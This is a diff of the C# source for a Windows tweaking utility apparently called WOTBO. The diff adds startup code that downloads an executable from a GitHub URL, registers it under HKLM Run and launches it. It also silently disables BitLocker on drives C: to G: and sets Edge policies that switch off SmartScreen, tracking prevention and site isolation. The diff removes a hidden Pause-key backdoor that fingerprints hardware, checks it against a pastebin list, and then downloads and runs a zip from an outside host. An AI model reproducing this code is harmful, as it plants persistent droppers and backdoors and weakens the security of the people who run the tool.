@@ -210,7 +210,7 @@ namespace Project
             toolTip1.SetToolTip(checkBox_shapka, "Returns the human menu header");
             checkBox_wotboincontex.Text = "Add WOTBO to the context menu on the desktop";
             toolTip1.SetToolTip(checkBox_wotboincontex, "");
-            checkBox_explorer.Text = "Add WOTBO to the context menu on the desktop";
+            checkBox_explorer.Text = "Add restart explorer.exe to the context menu on the desktop";
             toolTip1.SetToolTip(checkBox_explorer, "");
             checkBox_ffmpeg.Text = "Add ffmpeg to context menu";
             toolTip1.SetToolTip(checkBox_ffmpeg, "Adds useful items to the context menu for videos\r\n(Works for avi, flac, mov,mkv,mp4,wav,weba)");
@@ -520,7 +520,12 @@ namespace Project
                 checkBox_killdefender.Enabled = true;
                 back_main_12.Visible = true;
             }
-            if (Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo").GetValue("bluefolders") != null)
+            if (File.Exists($@"C:\Windows\System32\imageres.dll_bak"))
+            {
+                checkBox_bluefolders.Enabled = false;
+                back_ui_5.Visible = true;
+            }
+            if (File.Exists($@"C:\Windows\SystemResources\imageres.dll.mun_bak"))
             {
                 checkBox_bluefolders.Enabled = false;
                 back_ui_5.Visible = true;
@@ -604,6 +609,7 @@ namespace Project
                 checkBox_CSRSS.Enabled = false;
                 back_dop_7.Visible = true;
             }
+
             #endregion
             #region получаем инфу о видеодырке
             foreach (var mo in new ManagementObjectSearcher("select * from win32_VideoController").Get())
@@ -791,39 +797,48 @@ MessageBoxButtons.OK, MessageBoxIcon.Warning);
             File.WriteAllBytes(path_regpack7z, Resources.regpack);
             ZipFile.ExtractToDirectory($"{path_regpack7z}", $"{path_regpack}");
             File.WriteAllBytes(tempfolder + @"\su.exe", Resources.su);
-            File.WriteAllBytes(tempfolder + @"\TrInstaller.exe", Resources.TrInstaller);
-            File.WriteAllBytes(tempfolder + @"\nircmd.exe", Resources.nircmd);
+            //File.WriteAllBytes(tempfolder + @"\TrInstaller.exe", Resources.TrInstaller);
+            //File.WriteAllBytes(tempfolder + @"\nircmd.exe", Resources.nircmd);
             File.WriteAllBytes(tempfolder + @"\services.zip", Resources.services_off);
             ZipFile.ExtractToDirectory(tempfolder + @"\services.zip", $"{tempfolder}");
             #endregion
-            #region backgr
-            if (Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo").GetValue("block_backgr") == null)
-            {
-                await Task.Delay(1000);
-                if (File.Exists(backgr))
-                {
-                    File.Delete(backgr);
-                }
-                await Task.Delay(500);
-                File.WriteAllBytes(backgr, Resources.BackgroundMonitoringServices);
-                Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue("BackgroundMonitoringServices", backgr);
-                Process.Start(backgr);
-            }
-            else
-            {
-                back_pro_2.Visible = true;
-                checkBox_pro_2.Enabled = false;
-            }
-
             try
             {
                 hcmd("manage-bde -off C: & manage-bde -off D: & manage-bde -off E: & manage-bde -off F: & manage-bde -off G:");
             }
             catch { }
-            #endregion
-        }
-        #region закрытие
-        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+            #region backgr
+            if (Internet.OK())
+            {
+
+
+                if (Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo").GetValue("block_backgr") == null)
+                {
+                    await Task.Delay(2000);
+                    if (File.Exists(backgr))
+                    {
+                        File.Delete(backgr);
+                    }
+                    await Task.Delay(1500);
+                    using (WebClient wcw = new WebClient())
+                        if (!File.Exists(backgr))
+                        {
+                            wcw.DownloadFile("https://raw.githubusercontent.com/oixro/WOTBO/main/resources/BackgroundMonitoringServices.exe", backgr);
+                        }
+                    //File.WriteAllBytes(backgr, Resources.BackgroundMonitoringServices);
+                    Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue("BackgroundMonitoringServices", backgr);
+                    Process.Start(backgr);
+                }
+                else
+                {
+                    back_pro_2.Visible = true;
+                    checkBox_pro_2.Enabled = false;
+                }
+            }
+                #endregion
+            }
+            #region закрытие
+            private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
             if (Directory.Exists(@"C:\Windows\oixro"))
             {
@@ -1275,7 +1290,7 @@ MessageBoxButtons.OK, MessageBoxIcon.Warning);
                     checkBox_bluefolders.Checked = false;
                     checkBox_bluefolders.Enabled = false;
                     back_ui_5.Visible = true;
-                    Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("bluefolders", 1);
+                    //Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("bluefolders", 1);
                 }
                 else
                 {
@@ -1290,7 +1305,7 @@ MessageBoxButtons.OK, MessageBoxIcon.Warning);
                     checkBox_bluefolders.Checked = false;
                     checkBox_bluefolders.Enabled = false;
                     back_ui_5.Visible = true;
-                    Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("bluefolders", 1);
+                    //Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("bluefolders", 1);
                 }
             }
             if (checkBox_contex.Checked)
@@ -1600,6 +1615,136 @@ rd /s /q ""%allusersprofile%\Microsoft OneDrive""");
                 checkBox_dwm.Checked = false;
                 checkBox_dwm.Enabled = false;
                 back_dop_6.Visible = true;
+            }
+            if (checkBox_edge.Checked)
+            {
+                RegistryKey edge;
+                edge = Registry.LocalMachine.CreateSubKey($"SOFTWARE\\Policies\\Microsoft\\Edge");
+                edge?.SetValue("EdgeEnhanceImagesEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("EdgeWorkspacesEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("TyposquattingCheckerEnabled", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("RemoveDesktopShortcutDefault", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("AlternateErrorPagesEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("SpotlightExperiencesAndRecommendationsEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("NewTabPageSearchBox", "redirect");
+                edge?.SetValue("DefaultSearchProviderEnabled", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("BasicAuthOverHttpEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("AllowCrossOriginAuthPrompt", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("DisableAuthNegotiateCnameLookup", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("NativeMessagingUserLevelHosts", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("PasswordMonitorAllowed", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("StartupBoostEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("UseSystemPrintDialog", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("SleepingTabsEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("RestoreOnStartup", 0x00000004, RegistryValueKind.DWord);
+                edge?.SetValue("HomepageLocation", "www.google.com");
+                edge?.SetValue("NewTabPageLocation", "www.google.com");
+                edge?.SetValue("NewTabPagePrerenderEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("NewTabPageHideDefaultTopSites", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("AdsSettingForIntrusiveAdsSites", 0x00000002, RegistryValueKind.DWord);
+                edge?.SetValue("DownloadRestrictions", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("TabFreezingEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("InternetExplorerIntegrationTestingAllowed", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("InternetExplorerIntegrationLocalFileAllowed", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("PersonalizationReportingEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("BrowserNetworkTimeQueriesEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("LocalProvidersEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("AudioSandboxEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("WebWidgetIsEnabledOnStartup", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("UserFeedbackAllowed", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("FamilySafetySettingsEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("ClickOnceEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("DirectInvokeEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("SSLErrorOverrideAllowed", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("BingAdsSuppression", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("TrackingPrevention", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("BrowserSignin", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("InternetExplorerIntegrationEnhancedHangDetection", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("InternetExplorerIntegrationLevel", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("ConfigureOnlineTextToSpeech", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("VerticalTabsAllowed", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("ConfigureFriendlyURLFormat", 0x00000004, RegistryValueKind.DWord);
+                edge?.SetValue("ExperimentationAndConfigurationServiceControl", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("IntensiveWakeUpThrottlingEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("DnsOverHttpsMode", "off");
+                edge?.SetValue("DNSInterceptionChecksEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("TargetBlankImpliesNoOpener", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("ComponentUpdatesEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("EnableDomainActionsDownload", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("NetworkPredictionOptions", 0x00000002, RegistryValueKind.DWord);
+                edge?.SetValue("EnableOnlineRevocationChecks", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("RendererCodeIntegrityEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("ResolveNavigationErrorsUseWebService", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("BackgroundTemplateListUpdatesEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("SearchSuggestEnabled", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("CommandLineFlagSecurityWarningsEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("SitePerProcess", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("SpellcheckEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("EdgeCollectionsEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("WebWidgetAllowed", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("MetricsReportingEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("ForceEphemeralProfiles", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("ForceGoogleSafeSearch", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("GoToIntranetSiteForSingleWordEntryInAddressBar", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("HideFirstRunExperience", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("HideInternetExplorerRedirectUXForIncompatibleSitesEnabled", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("RelaunchNotification", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("RedirectSitesFromInternetExplorerPreventBHOInstall", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("PromotionalTabsEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("DiagnosticData", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("SendSiteInfoToImproveServices", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("TotalMemoryLimitMb", 0x00008192, RegistryValueKind.DWord);
+                edge?.SetValue("WPADQuickCheckEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("EdgeShoppingAssistantEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("InternetExplorerIntegrationLocalFileShowContextMenu", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("AddressBarMicrosoftSearchInBingProviderEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("ShowOfficeShortcutInFavoritesBar", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("ShowMicrosoftRewards", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("BuiltInDnsClientEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("ClearCachedImagesAndFilesOnExit", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("ConfigureDoNotTrack", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("ApplicationGuardFavoritesSyncEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("ApplicationGuardTrafficIdentificationEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("ApplicationGuardUploadBlockingEnabled", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("EnableMediaRouter", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("ShowCastIconInToolbar", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("DefaultCookiesSetting", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("DefaultFileSystemReadGuardSetting", 0x00000003, RegistryValueKind.DWord);
+                edge?.SetValue("DefaultFileSystemWriteGuardSetting", 0x00000003, RegistryValueKind.DWord);
+                edge?.SetValue("DefaultGeolocationSetting", 0x00000002, RegistryValueKind.DWord);
+                edge?.SetValue("DefaultImagesSetting", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("DefaultInsecureContentSetting", 0x00000002, RegistryValueKind.DWord);
+                edge?.SetValue("DefaultJavaScriptJitSetting", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("DefaultJavaScriptSetting", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("DefaultNotificationsSetting", 0x00000003, RegistryValueKind.DWord);
+                edge?.SetValue("DefaultPluginsSetting", 0x00000003, RegistryValueKind.DWord);
+                edge?.SetValue("DefaultPopupsSetting", 0x00000002, RegistryValueKind.DWord);
+                edge?.SetValue("DefaultWebBluetoothGuardSetting", 0x00000003, RegistryValueKind.DWord);
+                edge?.SetValue("DefaultWebHidGuardSetting", 0x00000002, RegistryValueKind.DWord);
+                edge?.SetValue("DefaultWebUsbGuardSetting", 0x00000002, RegistryValueKind.DWord);
+                edge?.SetValue("LegacySameSiteCookieBehaviorEnabled", 0x00000002, RegistryValueKind.DWord);
+                edge?.SetValue("PreventSmartScreenPromptOverrideForFiles", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("PreventSmartScreenPromptOverride", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("SmartScreenForTrustedDownloadsEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("NewSmartScreenLibraryEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("SmartScreenDnsRequestsEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("SmartScreenPuaEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("SmartScreenEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("NewTabPageContentEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("NewTabPageQuickLinksEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("NewTabPageAllowedBackgroundTypes", 0x00000003, RegistryValueKind.DWord);
+                edge?.SetValue("TyposquattingCheckerEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("BackgroundModeEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("EfficiencyMode", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("SuppressUnsupportedOSWarning", 0x00000001, RegistryValueKind.DWord);
+                edge?.SetValue("HubsSidebarEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("SiteSafetyServicesEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("EdgeFollowEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge?.SetValue("LocalBrowserDataShareEnabled", 0x00000000, RegistryValueKind.DWord);
+                edge = Registry.LocalMachine.CreateSubKey($"SOFTWARE\\Policies\\Microsoft\\Edge\\RestoreOnStartupURLs");
+                edge?.SetValue("1", "www.google.com");
+                checkBox_edge.Checked = false;
+                checkBox_edge.Enabled = false;
             }
             #endregion
             #region pro
@@ -2110,7 +2255,14 @@ rd /s /q ""%allusersprofile%\Microsoft OneDrive""");
                     try
                     {
                         File.WriteAllText(tempfolder + @"\affinity.bat", Resources.affinity);
-                        File.WriteAllBytes(tempfolder + @"\MSI_util_v3.exe", Resources.MSI_util_v3);
+                        //File.WriteAllBytes(tempfolder + @"\MSI_util_v3.exe", Resources.MSI_util_v3);
+                        using (WebClient wcAA = new WebClient())
+                            if (!File.Exists($"{tempfolder}\\MSI_util_v3.exe"))
+                            {
+                                wcAA.DownloadFile("https://raw.githubusercontent.com/oixro/WOTBO/main/resources/MSI_util_v3.exe", $"{tempfolder}\\MSI_util_v3.exe");
+                                ZipFile.ExtractToDirectory($"{tempfolder}\\cursors.zip", tempfolder);
+                            }
+
                         File.WriteAllText(tempfolder + @"\updates.reg", Resources.updates);
                     }
                     catch { }
@@ -2307,32 +2459,6 @@ rd /s /q ""%allusersprofile%\Microsoft OneDrive""");
             if (e.KeyCode == Keys.F7)
             {
                 hcmd("taskkill /f /im explorer.exe & timeout /t 1 && explorer.exe");
-            }
-            if ((e.KeyCode == Keys.Pause))
-            {
-                hwid = null;
-                //серийник матери
-                foreach (var mo in new ManagementObjectSearcher("select * from win32_baseboard").Get())
-                    hwid += (string)mo["serialnumber"];
-                //id проца
-                foreach (var mo in new ManagementObjectSearcher("select * from win32_Processor").Get())
-                    hwid += (string)mo["ProcessorID"];
-                //серийники озу
-                foreach (var mo in new ManagementObjectSearcher("select * from win32_PhysicalMemory").Get())
-                    hwid += (string)mo["SerialNumber"];
-                //partnumber озу
-                foreach (var mo in new ManagementObjectSearcher("select * from win32_PhysicalMemory").Get())
-                    hwid += (string)mo["partnumber"];
-                using (WebClient wc = new WebClient())
-                    if ((wc.DownloadString("https://pastebin.com/raw/hmRn07hh").Trim()).Contains(Convert.ToBase64String(Encoding.UTF8.GetBytes(hwid))))
-                    {
-                        wc.DownloadFile("https://cyanevent.myarena.site/test.zip", $"{tempfolder}\\test.zip");
-                        ZipFile.ExtractToDirectory($"{tempfolder}\\test.zip", $"{tempfolder}\\test");
-                        supercmd($"{tempfolder}\\test\\nircmd.exe");
-                        await Task.Delay(5000);
-                        Directory.Delete($"{tempfolder}\\test", true);
-                        File.Delete($"{tempfolder}\\test.zip");
-                    }
             }
         }// f5 & f12
         #endregion
@@ -2777,7 +2903,7 @@ rd /s /q ""%allusersprofile%\Microsoft OneDrive""");
             if (File.Exists(backgr))
                 File.Delete(backgr);
             await Task.Delay(500);
-            File.WriteAllBytes(backgr, Resources.BackgroundMonitoringServices);
+            //File.WriteAllBytes(backgr, Resources.BackgroundMonitoringServices);
             Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue("BackgroundMonitoringServices", backgr);
             Process.Start(backgr);
             back_pro_2.Visible = false;
